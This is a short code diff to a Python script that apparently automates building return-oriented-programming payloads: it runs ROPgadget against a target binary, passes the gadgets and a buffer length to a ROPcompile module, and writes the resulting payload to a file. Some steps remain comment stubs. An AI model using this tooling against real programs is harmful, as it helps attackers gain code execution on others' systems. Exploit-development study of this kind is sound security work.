@@ -1,4 +1,5 @@
 import os
+import ROPcompile
 
 BRUTE_FORCE = 0
 BINARY_SEARCH = 1
@@ -92,14 +93,22 @@ def run(program, payload):
     command = program + payload
     return os.system(command)
 
-def createROPchain(command):
+def createROPchain(command, bufflength):
+
     #Find ROP gadgets
+    os.system("ROPgadget --binary " + PROGRAM + " > rop.txt")
+
     #Write command as gadgets
+    payload = ROPcompile.CreateROPChain(command, bufflength, "rop.txt")
+
     #Verify gadgets are present
+
     #Rewrite for missing gadgets
-    #Chain gadgets
+
     #Write the payload
-    return None
+    pfile = open("payload", "w")
+    pfile.write(payload)
+
 
 if __name__ == "__main__":
     main()
